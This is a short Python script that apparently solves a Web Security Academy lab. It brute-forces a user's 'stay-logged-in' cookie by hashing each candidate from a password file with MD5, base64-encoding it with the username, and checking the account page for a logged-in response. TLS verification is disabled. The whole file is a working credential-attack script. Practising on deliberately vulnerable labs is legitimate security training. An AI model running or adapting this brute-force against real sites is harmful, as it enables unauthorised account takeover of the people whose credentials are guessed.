import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = 'https://0a4c000904b731418083ee0000c20021.web-security-academy.net' 

with open('../pass.txt', 'r') as file:
    while True:
        pwd = file.readline()
        if not pwd:  # End of file reached
            break
        print(pwd)
        cookie_val = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode('utf-8')).hexdigest()
        cookie_val_base64_bytes = base64.b64encode(bytes(cookie_val, "utf-8"))
        cookie_val_base64 = cookie_val_base64_bytes.decode("utf-8")

        r  = requests.Session()
        myaccount_url = url + "/my-account"
        cookies = {'stay-logged-in': cookie_val_base64}
        req = r.get(
            myaccount_url,
            cookies=cookies,
            verify=False,
            # proxies=proxies
        )
        if "Log out" in req.text:
            print("(+) Carlos's password is: " + pwd)
            sys.exit(-1)

